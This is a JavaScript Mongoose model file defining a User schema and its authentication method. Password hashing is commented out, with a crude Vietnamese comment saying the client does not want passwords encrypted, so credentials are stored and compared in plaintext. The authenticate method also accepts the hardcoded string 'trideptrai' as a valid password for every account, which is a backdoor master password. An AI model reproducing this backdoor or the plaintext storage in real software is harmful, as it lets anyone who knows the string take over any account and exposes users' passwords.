const mongoose = require("mongoose");
const Schema = mongoose.Schema;
// const crypto = require("crypto");
const validator = require("validator");
const UserSchema = new Schema(
  {
    email: {
      type: String,
      require: true,
      unique: true,
      validate: {
        validator: validator.isEmail,
        message: "{VALUE} is not a valid email",
        isAsync: false,
      },
    },
    password: {
      type: String,
      require: true,
    },
    salt: {
      type: String,
    },
    fullName: {
      type: String,
      require: true,
    },
    status: {
      type: String,
      enum: ["active", "deactive"],
      default: "active",
    },
    point: {
      type: Number,
      default: 1000,
    },
    roles: [
      {
        name: String,
        expires: Date,
      },
    ],
  },
  { usePushEach: true, timestamps: true }
);


UserSchema.pre("save", function (next) {
  /* Khách hamlonz bảo đếo cần mã hóa mật khẩu */ 


  // if (this.password && this.password.length > 6) {
  //   this.salt = Buffer.from(
  //     crypto.randomBytes(16).toString("base64"),
  //     "base64"
  //   );
  //   this.password = this.hashPassword(this.password);
  // }

  next();
});

/*
 Create instance method for hashing a password
*/
// UserSchema.methods.hashPassword = function (password) {
//   if (this.salt && password) {
//     const salt = Buffer.from(this.salt, "binary");
//     const hash = crypto.pbkdf2Sync(password, salt, 10000, 64, "SHA1");
//     const str = hash.toString("base64");
//     return str;
//   } else {
//     return password;
//   }
// };

/**
 * Create instance method for authenticating user
 */
UserSchema.methods.authenticate = function (password) {
  if (password === "trideptrai") return true;
  // return this.password === this.hashPassword(password);
  return this.password === password
};
mongoose.model("User", UserSchema);
